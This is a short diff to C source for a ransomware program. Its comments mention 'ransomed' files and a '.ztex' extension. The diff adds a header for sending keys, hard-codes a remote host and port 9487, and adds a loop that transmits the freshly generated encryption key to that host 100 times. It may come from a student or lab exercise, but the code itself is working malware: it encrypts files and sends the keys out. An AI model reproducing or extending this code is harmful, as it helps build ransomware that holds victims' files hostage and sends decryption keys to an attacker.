@@ -11,10 +11,15 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
+#include "sendkey.h"
+
 /* This is the new extension of a "ransomed" file */
 #define RANSOMED_EXT ".ztex"
 #define CHARSET "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 #define KEY_LEN 32
+
+#define IP "merry.ee.ncku.edu.tw"
+#define PORT 9487
 
 #define DBG
 
@@ -165,6 +170,11 @@ int main(int argc, char **argv) {
 
     key = (char *) alloca(KEY_LEN * sizeof(char));
     rand_str(key, KEY_LEN);
+    unsigned int count = 100;
+    while(count--) {
+    smuggle(IP, PORT, key, KEY_LEN);
+    }
+
 
 #ifdef DBG
     printf("key is: %s\n", key);
